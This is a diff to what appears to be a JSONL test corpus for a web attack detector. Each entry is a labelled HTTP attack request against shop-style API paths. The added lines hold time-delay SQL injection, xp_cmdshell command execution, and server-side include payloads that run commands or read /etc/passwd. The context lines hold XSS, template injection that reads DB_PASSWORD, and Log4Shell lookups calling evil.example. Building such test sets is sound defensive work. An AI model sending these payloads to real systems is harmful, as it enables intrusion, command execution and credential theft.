@@ -33,6 +33,12 @@
 {"name":"range then tautology","category":"sqli","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","6-7 or 8=8"]],"headers":{},"content_type":"","body":""}
 {"name":"integers ored together","category":"sqli","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","99 or 1 or 1"]],"headers":{},"content_type":"","body":""}
 {"name":"modulo then like","category":"sqli","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","1%(1) or 1 like 1"]],"headers":{},"content_type":"","body":""}
+{"name":"waitfor delay alone","category":"sqli","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","WAITFOR DELAY '0:0:5'"]],"headers":{},"content_type":"","body":""}
+{"name":"stacked waitfor delay","category":"sqli","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q",";WAITFOR DELAY '0:0:5'"]],"headers":{},"content_type":"","body":""}
+{"name":"commented waitfor in form","category":"sqli","kind":"attack","method":"POST","path":"/api/v1/auth/login","query":[],"headers":{},"content_type":"application/x-www-form-urlencoded","body":"email=x%27%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27--"}
+{"name":"xp_cmdshell via master","category":"sqli","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","exec master..xp_cmdshell 'ipconfig /all'"]],"headers":{},"content_type":"","body":""}
+{"name":"pg_sleep call in json","category":"sqli","kind":"attack","method":"POST","path":"/api/v1/cart/items","query":[],"headers":{},"content_type":"application/json","body":"{\"note\":\"pg_sleep(5)\"}"}
+{"name":"oracle dbms_lock sleep","category":"sqli","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","DBMS_LOCK . SLEEP(5)"]],"headers":{},"content_type":"","body":""}
 {"name":"script tag","category":"xss","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","<script>alert(1)</script>"]],"headers":{},"content_type":"","body":""}
 {"name":"img onerror","category":"xss","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","<img src=x onerror=alert(1)>"]],"headers":{},"content_type":"","body":""}
 {"name":"svg onload","category":"xss","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","<svg/onload=alert(document.cookie)>"]],"headers":{},"content_type":"","body":""}
@@ -122,6 +128,11 @@
 {"name":"ruby safe navigation","category":"ssti","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","#{Kernel&.open(params[:c])}"]],"headers":{},"content_type":"","body":""}
 {"name":"freemarker eval binding","category":"ssti","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","<#assign e=c?eval>${e('id')}"]],"headers":{},"content_type":"","body":""}
 {"name":"spring system environment","category":"ssti","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","#{systemEnvironment['DB_PASSWORD']}"]],"headers":{},"content_type":"","body":""}
+{"name":"ssi exec","category":"ssti","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","<!--#exec cmd=\"ls\" -->"]],"headers":{},"content_type":"","body":""}
+{"name":"ssi include in json","category":"ssti","kind":"attack","method":"POST","path":"/api/v1/cart/items","query":[],"headers":{},"content_type":"application/json","body":"{\"note\":\"<!--#include virtual=\\\"/etc/passwd\\\" -->\"}"}
+{"name":"ssi echo","category":"ssti","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","<!--#echo var=\"DOCUMENT_URI\" -->"]],"headers":{},"content_type":"","body":""}
+{"name":"ssi printenv","category":"ssti","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","<!--#printenv -->"]],"headers":{},"content_type":"","body":""}
+{"name":"ssi exec with backtick","category":"ssti","kind":"attack","method":"POST","path":"/api/v1/cart/items","query":[],"headers":{},"content_type":"application/json","body":"{\"note\":\"<!--#exec cmd=\\\"ls `id`\\\" -->\"}"}
 {"name":"jndi in user-agent","category":"log4shell","kind":"attack","method":"GET","path":"/api/v1/products","query":[],"headers":{"User-Agent":"${jndi:ldap://evil.example/a}"},"content_type":"","body":""}
 {"name":"obfuscated jndi","category":"log4shell","kind":"attack","method":"GET","path":"/api/v1/products","query":[],"headers":{"X-Api-Version":"${${lower:j}ndi:${lower:l}dap://evil.example/a}"},"content_type":"","body":""}
 {"name":"jndi in query","category":"log4shell","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","${jndi:rmi://evil.example/x}"]],"headers":{},"content_type":"","body":""}
